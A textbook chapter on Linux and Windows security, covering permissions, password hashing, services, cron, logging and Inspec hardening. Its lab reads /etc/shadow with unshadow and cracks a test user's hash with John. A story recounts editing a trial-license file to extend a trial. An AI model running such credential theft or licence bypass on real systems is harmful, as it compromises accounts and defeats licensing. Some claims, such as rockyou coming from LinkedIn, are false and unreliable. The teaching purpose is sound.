# Operating System Security
![](../images/05/windows_linux.jpg)

Modern operating systems (OS) have built in security measures to ensure that information stored and processed by them are secured to authorized users.  Administrators and object owners can determine who and what level of access accounts have on the device.  Operating systems also have features that have security implications that we will explore.  These features themselves can be abused to enable an attacker to meet their impact objectives.  Learning about them and how they work will help us when we explore persistence and privilege escalation techniques in the next chapter.

**Objectives**
1. Understanding of Linux file, user, service, and logging systems.
2. Conduct system hardening and benchmarking activities using Inspec.
3. Learn the file, user, service, and logging systems in Windows.
4. Perform Windows Defender antivirus bypass.
## Linux
In this section we will emphasize basic Linux file, authorization, user, and password systems.  It will also explore how the operating system manages running applications, scheduled tasks, and logs which hold significant security value.
### File System
Within Linux, *everything is a file*, or they are at least represented that way.  Unintuitive things like memory space and devices are files that can be navigated to and explored using directory commands or file explorer applications.  When the operating system is installed, a partition is created on the hard drive and a file system is created.  The file system includes the instructions of how files and folders are stored within the partition, including the metadata of files, name requirements, and space requirements.  The **extension version 4 (ext4)** is the current and most common file system in support at the time of this writing.

The ext4 file system provides nested folders or directories under a root folder represented by a forward slash `/`.  Within the root folder are several other folders that meet the needs of the operating system  Some of the most common folders are represented in the following figure.
![[../images/05/linux_folders.png|Linux Folder Structure]]
Starting on the left and working our way to the right, we have the */bin* directory.  This folder holds the binaries, or applications, installed on the system.  The `/dev` folder has all the hardware devices that the operating system detects as connected.  Configuration files for the OS and the applications installed on it are located within the `/etc` folder.  Users files are stored within folders named after their usernames in the `/home` directory. The `/lib` folder contains library files needed during system boot and the `/mnt` folder is often used to hold references to other drives mounted on the device.  The `/opt` folder is used to store optional files and apps and is where I often store applications that I've installed on the system.  The `/root` directory is the root user's home directory and is unavailable to other system users.  Similar to the bin directory, the `/sbin` directory also holds binaries but the sbin folder is used for system specific applications.  The `/tmp` folder stores files that are used that are disposable and will be automatically deleted after some time or when rebooted.  Shared read only files, binaries, libraries, and manuals are installed in the `/usr` directory and variable files such as data files, logs, mail inboxes, and application files are within the `/var` directory.

In a following section we will discuss users and groups, but for now you should understand that everything in Linux is a file, and every file is owned by an user, or *owner*, and group.  Usually the user that creates the file is the owner and has full discretion on how it is used.  The owner, or any account within a group, can make any changes to the file.  File ownership can be altered using the built-in utility `chown`.  For example, a file `example.txt` can have its ownership changed to the `daniel` user and the `dev` group with the following command: `chown daniel:dev example.txt`.
### Authorization System
In the previous section we explored the ext4 file structure and suggested every file has an owner and group.  In addition every file can have *read (r)*, *write (w)*, and *execute (x)* permissions expressed for the owner, group, and *others*.  Owners are the creator or the assigned account of the file.  Any account on the Linux device can be assigned to one or more groups and a group can be assigned permissions to a file.  The last set is the others group, which apply to any other account on the system.

>[!note] Note - Self Group
>Each time an account or user is created, a corresponding default group using the account name is also created.  If an account `daniel` is created, a group named `daniel` is also created and user is automatically assigned to their like-named group.

The **permission set** for any file is displayed using the `ls -l` command.  The first 10 characters are dedicated to identifying permissions for each entity.  The first is used to label a directory with the letter `d` or `-` for file.  The next three characters identify permissions for the user.  The second set of three are for the assigned group.  And the last set of three characters define the permissions for others.  The 3rd and 4th column of the list command displays the owner and the group of the file.  The figure below illustrates the owner (daniel) and the group (dev) for the example.txt file.  It shows that daniel has read/write, dev has read, and everyone else (others) have read permission.
![[../images/05/linux_permission_set.png|Linux Permission Set|400]]
Read, write, and execute (rwx) can be set using the `chmod` command with *symbolic* or *octal* notation.  We have already covered the permission set using symbolic where the permissions are referenced using `r`, `w`, and `x`.  These same permissions can also be represented using octal, or numeric, notation.  Each permission is represented by a number as listed in the following table.

| Permission | Symbolic | Octal |
| ---- | ---- | ---- |
| Read | r | 4 |
| Write | w | 2 |
| Execute | x | 1 |
A permission set can then be referred to using the total of the octal permissions.  For example, if the user account www-data has read, write, and execute permissions on a file, the octal value is 4 + 2 + 1 = 7.  Under this notation, you can identify a symbolic set given just the octal value.  For another example, given the octal 5 you can infer that the permission set is read and execute because 4 and 1 is the only combination that gets to 5.  Symbolic notation references the permission set with the letters `u` for user, `g` for group, and `o` for others.  Octal references the user, group, and others permission sets in order of placement.  Therefore an octal permission set 754 means the user has `rwx`, the group has `rx`, and the other has `r` only.  Consider the following code block.

```bash
chmod ug+rwx example.txt
chmod o+r example.txt
chmod 777 example.txt
```

The first chmod command sets the user and group of example.txt to read, write, and execute permissions.  The second command sets the other permission set to read only while the last command uses octal notation setting read, write, and execute permissions for the user, group, and other.

> [!warning] Warning - Octal 777 Permission Set
> Setting read, write, and execute for all users and groups on a system is considered an insecure practice.  Many Linux systems will highlight the file and change the name color to red to warn of the setting.

There is also a special permission, called the *sticky bit*, that can allow an executable file to be ran as the file's owner or group.  In the case of the file the file is modified using chmod and the **set user ID (SUID)** is set and the symbolic notation execute bit `x` is replaced with an `s` for the user permission set.  I might look like `rws` instead of `rwx`.  Similarly, **set group ID (SGID)** is set in a similar fashion.  In either relative case, this allows the executable file to be ran by anyone as the owner or group.  SUIDs and SGIDs files can be helpful to Linux administrators when elevated access is needed only for a specific executable.  We will explore how SUID/SGIDs can be abused to achieve privilege escalation in the next chapter.
### User System
Linux users are created and modified by a system administrator using the `useradd` and `usermod` commands.  Users are usually assigned a folder of the same name under the `/home` directory where they are the default owners.  As mentioned earlier, they are also assigned into a group of the same username but they can be added to any other group.  In previous activities we demonstrated adding a user to the sudo group using the usermod command.  Users can be assigned an interactive logon shell, but they don't have to be.  A user account that doesn't have an interactive shell or home folder is referred to as a *system account*.  These user accounts are used for applications and can still have permissions granted to them for files on the system.  The following command creates a new user named `daniel` on the system.

```bash
useradd -m daniel
```

Any user can be added to any number of groups.  The power of groups comes to light when having to manage many users on a system.  The assignment of users to groups and groups to files allows administrators to organize and streamline the management of file access.  The following command creates a new group `dev` for which users can be assigned to.

```bash
groupadd dev
```

Managing users and groups by file promotes the separation of access supporting the security of the system.  For example, a web application running as the system user www-data may not need the permissions to read to files outside the www folder.  Should the web application running as the www-data user ever be compromised, its impact will be minimized to the files it can read.
### Password System
All interactive user accounts should have a strong password to logon the system and begin using files.  This means that passwords must be set and stored within the Linux system to ensure security through authentication.  Linux does not store user passwords in plaintext.  Instead, passwords are hashed and then stored on the system.  When a user logs in, or re-authenticates, their plaintext password is hashed.  The system takes the user supplied password hash and compares it against the stored password hash set for the user.  If the hash values match, the user is authenticated; otherwise, their access is denied.

The hashed passwords used to be stored, along side user information, within the `/etc/passwd` file.  This file contains information such as usernames, shell settings, home folders.  Hashed passwords were removed from this file because the other permission set had read permissions allowing anyone to see the hash passwords.  The danger of exposing a hashed password is that an attacker could attempt to crack it offline taking as much time as they need to do so.

Nowadays, the hashed password is stored in a file `/etc/shadow` that is only readable, and writable, by the root user.  Doing so limits the opportunity for a hash password to be leaked and cracked by an attacker.  The shadow file lists each account's username and hashed password separated by a colon.  Depending on the hash algorithm used, the hash password is delimited by dollar signs into three segments.  The first segment defines the algorithm type, the second segment is a salt, and the last segment is the hashed password.  A salt is a random unique string that is added to the user password when hashed.  This method ensures any two users with the same password will have different hashes.  It also slows down an attacker's computation capacity when attempting to crack many user's hashed passwords at once.  It also eliminates the risk of *rainbow password* attacks where attackers use pre-computed hash lists to crack a target hash password.

> [!activity] Activity - Shadow Cracking
> Hashed passwords can never be *unhashed*.  However, an attacker that has the hash can attempt to recreate it using bruteforce or dictionary methods.  Bruteforcing password hashes usually means computing the hash of foreach character combination and comparing them against a target hash until a match is found.  This becomes prohibitively expensive in time and energy the longer and higher entropy (random) a password is.  Alternatively, in a *dictionary attack*, a list of common passwords are hashed one at a time and their output is compared to the target hash.  A password is cracked when there is a match as the attacker knows the guessed password that was hashed.  
> 
> Using the Kali VM, I will create a test user and assign them a password.  Then I will prepare a hash file that can be used with the cracking tool John to crack the password using the rockyou password list.
> 
> First I launch a terminal and create a user tester using the following command.
> ```bash
> sudo useradd -m tester
> ```
> ![[../images/05/linux_activity_crack_useradd.png|Creating the User Tester|600]]
> With the user created, I set their password to the weak and all too common "Password123" using the passwd command.
> ```bash
> sudo passwd tester
> ```
> ![[../images/05/linux_activity_crack_pass_set.png|Setting Tester User Password|600]]
> Now that the vulnerable user is created I create a hash file using John's unshadow command.  This utility combines the passwd and shadow files into a new file that is compatible with John.  I pipe the result to grep to pull the line that has our tester victim then redirect that line into a file in the tmp folder called hash.txt.
> ```bash
> sudo unshadow /etc/passwd /etc/shadow | grep tester > /tmp/hash.txt
> ```
> ![[../images/05/linux_activity_crack_unshadow.png|Creating Unshadowed Hash File|600]]
> I'll launch a dictionary attack which requires a list of passwords.  Kali has many password lists already installed that I can use.  My favorite is the rockyou.txt list which consists of around 14 million passwords leaked from a LinkedIn breach many years ago.  The file is compressed so I use the gunzip utility to extract the list.
> ```bash
> sudo gunzip /usr/share/wordlists/rockyou.txt.gz
> ```
> ![[../images/05/linux_activity_crack_rockyou.png|Extracting Rockyou Password List|600]]
> The last step is to launch John against the hash file stored in the tmp directory.  I'll set the format to crypt as this is the format or algorithm used by Kali to hash passwords.  It takes about 5 minutes to complete on my virtual machine but could be much faster on a host computer with a GPU.
> ```bash
> john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
> ```
> ![[../images/05/linux_activity_crack_result.png|Cracked User Password Using John|600]]
> After the password is crack, John displays it alongside the user name!


>[!exercise] Exercise - Shadow Cracking
>Crack Linux passwords using John in your Kali VM with Bridge Adapter network mode.  You will create a user and set their password.  Then you will prepare the hash file and use John to crack the hash with the Rockyou wordlist.
>#### Step 1 - Create User
>Create a user “tester” using the following command.
>```bash
>sudo useradd -m tester
>```
>Set the tester user password to “Password123” with the following command.
>```bash
>sudo passwd tester
>```
>#### Step 2 - Prepare Password List
>Unzip rockyou.txt.gz with the following command.
>```bash
>gunzip /usr/share/wordlist/rockyou.txt.gz
>```
>#### Step 3 - Crack the Password
>With the tester user created and the rockyou.txt file unzipped, crack the password using John.  Collect the tester user’s password into a hash file.
>```bash
>sudo unshadow /etc/passwd /etc/shadow | grep tester > /tmp/hash.txt
>```
>Crack the user password, might take up to 5 minutes depending on your VM resources
>```bash
>john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
>```

### Processes
Any time an executable or command is ran on a Linux system, at least one new process will be created.  **Processes** are applications that have been loaded into memory by the system and are processed by the CPU.  The CPU will interact with the process' memory space to execute its machine code as designed.  When the process is created, it is given a *process id (PID)* which is a 5 digit number unique to any other running process on the operating system.  A process can invoke any number of additional applications which in turn create new processes.  These process invoked processes are attributed to the calling process known as the *parent PID (PPID)*.  The subordinate process to the parent is referred to as the *child process*.  Because commands or applications are ran under the context of a user, each process inherits the permissions of that particular user.  Each process user context is identifiable when enumerating processes running on a system.

> [!note] Note - Process Permissions
> The principle of least privilege should apply with processes because they can be abused to escalate privileges accessing system resources it should be allowed to.

> [!activity] Activity - Navigating Processes
> Processes can be created, observed, and stopped using pre-installed Linux commands.
> 
> Using the Ubuntu VM, I'll run the watch command to monitor changes to the `home` folder using the ls command.
> ```bash
> watch ls /home
> ```
> ![[../images/05/linux_activity_proc_watch.png|Running Watch and List Processes|600]]
> Because the command is continuously running, it is safe to assume there is a process that is running.  I can view the process details using the `ps` or process command with the options `auxwf`.  These options will show every option running and display in a tree mode for parent to child reference.
> ```bash
> ps auxwf
> ```
> ![[../images/05/linux_activity_proc_ps.png|Running Process Tree]]
> The process command displays my running `watch` command with a PID 4610.  The command shows that the process is a child process of a bash command, since it is running in a terminal.  I could stop the command in the window that it is running with `CTRL+C` but I could stop the process using the `ps` command.
> ```bash
> kill -9 4610
> ```
> ![[../images/05/linux_activity_proc_kill.png|Kill Running Process|600]]
> Once the kill command completes, the terminal where the watch command was running returns to bash with a "Killed" message.
> ![[../images/05/linux_activity_proc_killed.png|Killed Process Result|600]]
> Another useful tool is the `top` command which will display all running processes.  You can sort by resource dynamically and the tool output refreshes every second.
> ```bash
> top
> ```
> ![[../images/05/linux_activity_proc_top.png|Running Top Command|600]]
### Services
Processes, or applications, that continuously run in the background waiting for an event or doing a task are known as **services**.  A *daemon* is a long running process that is running in the background and is often used to describe a service.  But a service is much more than a long running process in the background as the system is specifically configured with a service system that defines a how the service will behave and its other attributes.  Therefore services are daemons but not all daemons are services - a service contains at least one daemon.

>[!activity] Activity - Exploring Systemd
>Linux manages services using the `systemd`, or system daemon, to manage the services on the device.  The service files are located in the `/etc/systemd/system/` directory as demonstrated in the following command.  Many of these files use symbolic links to reference other areas of the file system where the service file resides.
>```bash
>ls -la /etc/systemd/system/
>```
>![[../images/05/linux_activity_system_cat.png|Systemd Files|600]]
>One of the service files I observed in that etc folder was the Avahi service.  Service logs are stored in a journal maintained by systemd and can be queried using the `journalctl` service.  The following command shows the logs of the Avahi service.
>```bash
>sudo journalctl -u avahi-daemon
>```
>![[../images/05/linux_activity_journal.png|Service Logs from Journalct|600]]
>Another method for listing services is to use the built-in `systemctl` tool.  The following command lists all the services available on the Ubuntu VM.
>```bash
>systemctl --type=service
>```
>![[../images/05/linux_activity_systemctl.png|Systemctl List of Services]]
>I see that our Avahi is one of the services listed here.  It shows a status of loaded, active, and running.  We can explore the service status and logs using the systemctl command as well.
>```bash
>systemctl status avahi-daemon
>```
>![[../images/05/linux_activity_avahi_service_status.png|Systemctl Status of Avahi Service|600]]
>Of note is the loaded path of the service.  This path references the file of the Avahi service which can be examined further using the concatenate command.  I pipe the output of the cat command to grep and filter out any comments in the file for sake of brevity.
>```bash
>cat /lib/systemd/system/avahi-daemon.service | grep -v '#'
>```
>![[../images/05/linux_activity_avahi_service_file.png|Avahi Service File|600]]
>This file represents the configuration of the service.  All that is needed to create, or modify, a service is a file like this one in the systemd directory.  Of particular interest is the `ExecStart` value which shows the path to a system binary called avahi-daemon.  This binary is what is actually running in the background for the service.
>

Should an attacker gain direct or indirect control of the service referenced executable in its executable path, they will hijack the service.  Some services require elevated permissions to run effectively and if vulnerable to hijacking could allow an attacker to escalate their privileges.  Another abuse is to use the native system to establish persistence which will be covered in later sections.  Such attacks can be caused if the executable is modifiable by the attacker's account.  It can also be accomplished indirectly should the service executable use other executables that are in the attacker's control.  One last common misconfiguration is to grant access to modify service files allowing a malicious actor to change the executable that would be ran.
### Cron
The **cron** Linux system is used to schedule jobs, or *cron job*, ran by users and the system.  It is used to run binaries or scripts on a regular reoccurrence as defined by the cron folder the executable resides in or through the cron table, or *crontab*, file which allows custom jobs.  The crontab file is a configuration file available for every user on the system, including the root user.

> [!activity] Activity - Preparing Cronjobs
> I can create a cron job by editing the cron table file.  Cron comes with the built-in crontab command and specifying the `-e` option for editing.
> ```
> crontab -e
> ```
> This launches the cron table file into the editor of my choosing which can be modified with a special pattern to identify the frequency the job will run and the path to the executable.  My favorite website to create schedules is https://crontab.guru.  I'll add the following entry into my crontab file.  `5 4 * * sun` will run the `cat /etc/passwd` command at 4:05 every Sunday.
> ```
> 5 4 * * sun cat /etc/passwd
> ```
> Using the crontab command with the `-l` option to list the file I can see all the cronjobs scheduled for my user.  Again I use grep to filter out any comments within the file.
> ```
> crontab -l | grep -v '#'
> ```
> ![[../images/05/linux_activity_cron.png|Crontab List User Cronjobs|600]]
> The system, or root user, cronjobs can be listed as well from the `/etc/cron*` directories.  Binaries and scripts placed in these folders will be ran by root in the respective timeframe the folder describes. 
> ```
> ls -la /etc/cron*
> ```
> ![[../images/05/linux_activity_cron_list.png|Cron Folder List|600]]
> The logs for cron activity is found within the `/var/spool/cron/crontabs` file but it is only accessible by root.  It is most helpful when diagnosing or troubleshooting cron activity on a system.

Similar to services, cron job executables can be hijacked by attackers using the same methods.  It is important to ensure the executable that is used in a cron job is secured from modification by unauthorized parties.
### Logging
The results, output, and errors generated through applications, services, and daemons are aggregated within log files.  Log files can be very useful to administrators and security professionals when troubleshooting, monitoring, or auditing systems.  Administrators can review log files which can often include the results or error messages on a system applications.  This data can be used to inform the administrator on issues the application might be having that can often lead to a resolution.  Security professionals can use system logs for monitoring and auditing purposes.  Log entries can inform security members when an application has an anomalous security event that could indicate a compromise.  The logs are also useful during investigations to identify when certain activity occurred; enabling the security team to create a timeline of events among other insights.

Logs can be categorized into system and application types.  System logs usually include entries that are related to the operating system and its core components.  *Syslog* standardizes the logs from a system into a structure form that can be centralized and sent over a network for many systems.  Daemon message, or *dmesg*, logs is another standardization for applications that run in the background.  Both syslog and dmesg logs are typically kept in dedicated files that several applications feed into.  Application logs, however, are dedicated for a specific application.  For instance, an Apache web server includes access and error log files in a dedicated application log folder separate from other application logs.

> [!activity] Activity - Linux Log Files
> Log files are commonly stored withing the `/var/log` folder.  There we can see syslog, dmesg, and application logs.  The following command lists the files within the log folder.
> ```
> ls /var/log
> ```
> ![[../images/05/linux_activity_log_list.png|Linux Log List|600]]
> I can use cat or head commands to view the log entries.  In the first line of the `syslog` file we can see a timestamp, application name, and event description.
> ```
> sudo head -n 1 /var/log/syslog.log
> ```
> ![[../images/05/linux_acitvity_log_head.png|First Line of Syslog|600]]


The format and contents of logs can vary but they usually include common useful information such as, but not limited to, timestamps, user information, and description.  Each entry is referred to as an *event* and logs are rotated on the system by size.  Once a log file exceeds a pre-set capacity limit it is zipped and moved into a new numbered file by the logging system `logrotate`.  After a threshold of log files has been met the logging system will delete the oldest file and start a new log file - rotating the log data.   Logrotate will ensure any file ending in `.log` within the `/var/log` folder will follow these rules.
### Hardening
Linux systems can be exposed to security risks not only by insecure software but also through misconfigurations of the system.  Beyond the vulnerabilities a system might have, it can also be ill-equipped to handle security threats.  **Hardening** a system is the act of ensuring the prevention and detection of security threats.  The act of hardening a system reduces the likelihood and impact of security threats and is a standard practice for individuals serious about keeping systems secure. 

The following list in no particular order details common hardening activities:
- **Patch Management** - Code maintainers of operating systems and applications make periodic updates to their technologies to improve features, performance, and security vulnerabilities.  The availability of software and its current versions can be maintained centrally within repositories such as the *advanced package tool (apt)*.  Updating software can eliminate known vulnerabilities; however, implementing a system to automate the installation of security updates improves the security posture of a system.
- **Logging** - As discussed in this chapter's section covering logging, enabling logs is a good security practice as it benefits the monitoring and auditing of security events.  Ensuring that logs are enabled, and ideally centralized into another system, strengthens the overall security of a system. 
- **Disabling Services** - We've already covered how services can be a vector for persistence and privilege escalation but they can also provide initial access to a system.  A network service is a service that listens on an open socket on the device accepting network connections which can provide an opportunity for remote access.  Ensuring system services, both internal and network services, decreases the overall attack surface of a system and reduces security risks.
- **Removing Applications** - Popularized with the term *bloatware*, removing unneeded or unnecessary software also can reduce security vulnerabilities.  We should resign the fact that all software has vulnerabilities whether they are known or not, so removing unneeded software will reduce the total amount of vulnerabilities giving system administrators less to have to maintain.
- **Access Management** - System administrators are usually responsible for the creation, maintenance, and removal of accounts on a system.  The user system and authorization systems discussed in this chapter cover the importance and the security benefits of these systems.  Removing unneeded accounts and reducing permissions to least privilege are great security practices to reduce opportunities for abuse.  Administrators should conduct regular audits of these systems to ensure tight security is maintained.
- **Secure Configurations** - Reputable software running as services usually provide guidance on the responsibilities for administrators to ensure its secure configuration.  Ideally only the services with well tested configurations are deployed and it is up to administrators to ensure the standards are maintained over time.  Administrators should ensure other security systems on the device are also enabled and configured correctly, such as host firewalls and application control software like app armor. 

> [!activity] Activity - Linux Baseline Hardening
> There are several tools and standards that can be used to regularly test or audit the security posture of a systems.  These standards are usually referred to as *baselines* and are collections of rules for a particular technology.  Chef, a popular automation tool and framework, created the tool *inspec* which comes with a set of baselines that can be used to audit the security settings of a system.  In the following activity I'll demonstrate the use of inspec against the Ubuntu system to identify configurations that can be altered to improve the security of the system.
>  
>  I start the Ubuntu VM in bridge adaptor network mode and open a terminal to install inspec.  The tool's is available in Debian software package file (.deb) and can be downloaded using the built in wget utility.
>  ```
>  wget https://packages.chef.io/files/stable/inspec/4.18.114/ubuntu/20.04/inspec_4.18.114-1_amd64.deb
>  ```
>  ![[../images/05/linux_activity_inspec_download.png|Download Inspec DEB File|600]]
>  Once downloaded I initiate the installation using the dpkg command.
>  ```
>  sudo dpkg -i inspec_4.18.114-1_amd64.deb
>  ```
>  ![[../images/05/linux_activity_inspec_install.png|Installing Inspec|600]]
>  After a few seconds the software is installed and is ready to be used.  Inspec must be fed a compliance ruleset to be ran against our system.  I will use Dev-sec's linux-baseline ruleset in this demonstration.  The following command executes the linux-baseline while accepting the standard license terms from Chef.
>  ```
>  inspec exec https://github.com/dev-sec/linux-baseline --chef-license accept
>  ```
>  ![[../images/05/linux_activity_inspec_scan.png|Inspec Linux-Baseline Scan Result|600]]
>  After about a minute of scanning, Inspec returns a list of results.  As shown in the screenshot above, green rules with a checkmark indicate a rule that has passed with a secure setting.  The rules are collected into groups, called `controls`, with the a naming syntax os-##.  The first rule in the control os-02 reads "File /etc/shadow is expected to exist" suggesting that the shadow file is expected on the system.  If the shadow file did not exist we could expect this particular rule to fail which would then display in red with an "x" instead of a checkmark.  Scrolling down the report I can observe some failed rules as shown below.
>  ![[../images/05/linux_activity_inspec_fail.png|Inspec Failed Rules|600]]
>  The section os-05 has some passed and failed rules.  When a rule fails, Inspec informs us why it failed and offers the setting needed to pass the rule.  The first failed rule "login.defs UMASK is expected to include "027" fails with the comment "expected "022" to include "027"".  Don't worry if you don't know what login.defs is or what the UMASK setting is used for, that is what Google is for!  System administrators would take these rule violations and research how to correct them then apply changes needed.  Once they have been applied, Inspec should be re-ran to confirm the solution applied worked.  Many times a solution does not fix the issue and additional efforts are needed, so re-testing is an important step in any vulnerability or misconfiguration management system.
>  
>  The very end of the report provides us with summary statistics of the number of rule ran, skipped, passed, and failed.  Such summary statistics are beneficial as they can be compared between systems to identify which systems have the most violations or security risk.  Administrators can then concentrate their efforts on those systems with the most risk making the biggest positive impact to security.
>  ![[../images/05/linux_activity_inspec_summary.png|Inspec Summary Statistics|600]]


> [!exercise] Exercise - Linux Baseline Hardening
> Using inspec, run a Linux baseline scan on the Ubuntu VM in Bridge Adapter network mode.  Pick a failed rule, research how to fix it, fix it, and re-run the inspec scan to confirm the issue you selected has been resolved.
> #### Step 1 - Install Inspec
> Download the inspec package.
> ```
> wget https://packages.chef.io/files/stable/inspec/4.18.114/ubuntu/20.04/inspec_4.18.114-1_amd64.deb
> ```
> Install inspec using dpkg.
> ```
> sudo dpkg -i inspec_4.18.114-1_amd64.deb
> ```
> Confirm successful installation by displaying inspec help menu.
> ```
> inspec -help
> ```
> #### Step 2 - Run Inspec
> Run the inspec tool to detect baseline configuration issues.
> ```
> inspec exec [https://github.com/dev-sec/linux-baseline](https://github.com/dev-sec/linux-baseline) --chef-license accept
> ```
> #### Step 3 - Research an Issue
> Using the output of the previous scan, perform the following actions: 
> 1. Select a failed rule  
> 2. Research the rule and how to fix the issue   
> 3. Describe how this issue impacts security
> #### Step 4 - Fix the Issue
> With an issue researched, perform the following actions: 
> 1. Fix the issue on the Ubuntu VM 
> 2. Rerun inspec linux-baseline scan to confirm the issue has been resolved.

## Windows
This section is organized similarly to the Linux section for consistency sake.  It covers file, authorization, user and password systems.  It also introduces some of the compelling features the operating system has that relates security.
### File System
Microsoft has created several file systems over the years supported by various Windows operating system versions.  The most common and current system is the **new technology file system (NTFS)** which is being used on the Windows virtual machine being used throughout this text.  NTFS supports several features and security enhancements over previous file systems, such as the *file access table (FAT)*, by allowing increased capacity as well as discretionary access control.  The system allows for volumes of up to 16 exabytes and the file system consumes up to 400 megabytes of space in order to track the drive space and files on it.

Windows operating systems using NTFS create a number of file folders to store system and user files.  During installation of Windows, a volume is created with a drive letter under which standard folders are created and files kept.  The image below outlines some of the more interesting folders from a security perspective; although there are many more folders and subfolders not being covered here.
![[../images/05/win_folders.png|Common Windows Folders|500]]
Starting after the root directory on the left is the `Program Files` directory which contains 32 and 64-bit programs available to the operating system and users.  Similarly, the next folder, `Program Files (x86)` keeps 32-bit programs only.  The separation of folders reflect a long standing history of Microsoft supporting backwards capabilities.  Administrators and security professionals are often interested in the applications that are installed on systems as every application could expose additional risk to the device and is yet another program to keep up to date.  The `ProgramData` folder is hidden from view by default and includes data and files used by the applications installed on the operating system.

> [!story] Story - ProgramData Used for Software Licensing
> A software I use for educational purposes only, and not commercial use, has a 30 day trial period after which the user is locked out and required to purchase a license key.  Installing the software on a virtual machine and experimenting with the trial use I found that the software trial period persists between reinstallations.  A simple uninstall and reinstall does not bypass the trial period restriction.  However, I discovered that if I revert the virtual machine to its initial state, having taken a snapshot previously after a fresh install of the OS, I can reinstall the trial version of the software and the license tracker starts over.  Tinkering further I found that if I set the Windows time/date backwards 30 days or so with the trial expired the software recalculates the days I have left on the trial!  
> 
> With this information in hand I could only induct that the something on the Windows device tracks the time the software was installed from which persists between reinstallations.  Extending my experimentation I used `Regshot` to capture file system and registry changes before and after installation as well as before and after uninstalling the software.  I then compared the changes between the two activities to identify what persisted on the operating system.  This resulted in a list of a couple hundred registry entries and files to cover but I eventually found a data file stored in the ProgramData folder under a subfolder of the respective software.  Removing this file and reinstalling the software proved that it contained the data used to calculate the trial period as the reinstalled software trial clock started over!
> 
> Interested in the contents of this file and how it worked I decided to investigate it further.  It consists of binary data that isn't rendered usefully in Notepad.  The file itself is relatively small at about 128 bytes so I opened it into a hex editor and began changing a byte at a time and seeing how the program operated.  I reverse engineered several data components of the file discovering that it would include the license key placeholder, checksums, and more importantly timestamps used to determine the trial period expiration.  Altering the timestamp I was able to extend the available trial period to 9,999 days!

Similar to Linux, Windows creates a `Users` folder that contains user account home subfolders.  These folders contain files dedicated to the accounts use on the operating system but it also includes a public default folder for anyone to use.  Each user folder contains a hidden `AppData` folder that stores user software data files and can be a source of configurations and secret storage.  Also off the root folder is the `Windows` folder where the Windows operating system files are stored.  This folder contains many subfolders and files but also includes the `System`, and 32-bit folder `System32` that has 64-bit files (go figure), where *dynamic link library (DLL)* binaries are installed that applications can use to *safely* interact with the kernel of the operating system via the Windows *application program interface (API)*. 

>[!tip] Tip - Forward and Back Slashes in Directory Trees
>Windows relies on the use of backslashes in the directory tree while Linux uses forward slashes.
### Authorization System
Windows supports granular access controls over file objects via NTFS.  This discretionary access control consists of basic permission sets, similar to Linux's read, write, execute paradigm.  NTFS uses the following permissions:

- **Full Control** - Complete capability over the object and granting of access rights to other accounts/users. 
- **Modify** - Edit permissions over the file.
- **Read & Execute** - View and run files
- **Read** - View only.
- **Write** - Replace file contents.

These permissions are usually enough for most circumstances; however, NTFS offers advance permissions providing even further capability to grant granular permissions per object.  Such capability promotes the principle of least privilege and can be used by administrators to limit an account access and use of file on the system.

> [!activity] Activity - Exploring Windows NTFS Permissions
> Using the Windows VM I run File Explorer to analyze permissions on a file within they System32 folder.  This folder contains a crypt32.dll file which offers Windows API cryptographic functions that I can check its NTFS permissions.
> 
> Navigating to the folder with the file I right-click the file and select the Properties option from the context menu.
> ![[../images/05/win_activity_ntfs_properties.png|Crypt32.dll File Properties|600]]
> This launches the file's properties menu where general information about the file can be observed.  I select the Security tab which reveals the basic NTFS permissions set on the file.  Principals are listed under the "Group or user names" section.  Selecting a principal displays their basic NTFS permissions within the table at the bottom of the window.  The ALL APPLICATION PACKAGES principal has the Read & execute and the Read permissions allowed as indicated by the check mark.
> ![[../images/05/win_activity_crypt_security_settings.png|Crypt32.dll Security Settings|350]]
> I select the Users group and then the Advanced button to display the advanced NTFS permission associated with all users on the system.  Because the Users group doesn't own this file, any changes to it require Administrator permissions.  The file's advanced NTFS permissions can be altered by pressing the Change permissions button at the bottom of window.
> ![[../images/05/win_activity_crypt32_adv.png|Crypt32 Advanced NTFS Permissions]]
> Selecting the Users principal and then the View button shows the basic NTFS permissions but also offers the advanced permissions link in the upper right corner.  Selecting it reveals the advanced permission settings of the file which offer more granular control over the file.
> ![[../images/05/win_activity_crypt32_adv_perms.png|Crypt32 Advanced Permissions for Users|600]]
### User System
A Windows operating system supports accounts, which server as security principals, and can be used to limit permissions to files.  There are a few types of accounts worth exploring.  A *user* or *local* account is associated with a human and allows for interactive logon.  This means the user has a username and password used to access the system and its file.  Similar to Linux, there are non-human accounts meant for systems to use and are referred to as *service accounts* or *service principals*.  In either case, the account is created on the system and can only be used on that system.

Microsoft supports *online accounts* which are accounts created and maintained within Microsoft's cloud solutions.  An online account can be tied to the local system and used for interactive logons between systems.  This allows users to store data, such as license keys, outside the system brining cross system functionality between systems.  The trade off is that Microsoft ultimately controls and store this data while enabling the remote accessibility to it.  This data could be reached by almost anyone with access across the world should the account become compromised.

Windows also supports two local groups, versus Linux's dynamic groups, to categorize accounts.  The *user* group is the default group that all accounts belong to whereas the *local administrator* group has elevated permissions allowing it full access to the operating system.  For example, a local administrator has the ability to install software within the Program Files folder or create new users accounts while accounts in the user group cannot.

Beyond the scope of this book, but of high security interest, are *domain controllers* that include *Active Directory* which is a Microsoft software product used to manage accounts and groups within enterprises.  Administrators of this system, *domain administrators*, create users and groups, known as *organization units (OU)*, and can assign them to objects such as computers.  This effectively enables administrators to control access at scale across many devices.  Another feature of domain controllers is the ability to create *group policy objects (GPO)* which can be assigned to OUs and facilitate security setting while leveraging the same scalability with Active Directory.
### Password System
Microsoft uses hashes to convert and authenticate Windows operating system passwords.  In the 1980's they developed the LAN Manager authentication scheme and its very insecure hash algorithm of the same name, **LM**.  It was based on now deprecated **Data Encryption Standard (DES)** algorithm which produces only 48 bit digests.  LM curtails the passwords to a maximum 14 characters, converts them to uppercase, encodes and pads the value, then splits the output into two 7-byte strings.  These strings are used to create DES values encrypted with a key that was published by Microsoft.  This algorithm erodes most of the security of having a long and high entropy (random) password and is usually easily cracked.  I would instruct the reader to ensure any of the systems they are responsible for maintaining the security of to avoid LM use; however, Microsoft has done a good job of making this algorithm backwards compatible and to this day its use is technically feasible.

Learning from the lessons of LM, Microsoft developed **New Technology LAN Manager (NTLM)** and later improved it and published a second version, *NTLMv2* which provides stronger cryptographic assurances making it more difficult to crack.  The NTLM value is based on MD4 and used in the deprecated, yet backwards compatible, NTLM authentication process.  

